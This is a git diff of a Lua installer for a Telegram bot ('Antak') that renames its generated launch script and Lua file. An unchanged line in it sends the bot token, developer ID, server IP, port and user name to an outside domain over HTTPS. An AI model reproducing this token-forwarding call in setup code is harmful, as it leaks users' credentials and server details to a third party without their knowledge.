@@ -78,7 +78,7 @@ SudoIds = {DevRio:get(Server.."IdAntak")},
 }
 Create(Config, "./config.lua") 
 https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevRio:get(Server.."IdAntak").."&TokenBot="..DevRio:get(Server.."TokenAntak").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
-file = io.open("Antak.sh", "w")  
+file = io.open("Antak-Fatime.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/Antak
@@ -97,9 +97,9 @@ echo "~ The Token Was Not Found In The config.lua File!"
 echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 exit 1
 fi
-./tg -s ./Antak.lua -p PROFILE --bot=$token
+./tg -s ./Antak-Fatime.lua -p PROFILE --bot=$token
 done
-]])  
+]])
 file:close()  
 file = io.open("Run", "w")  
 file:write([[
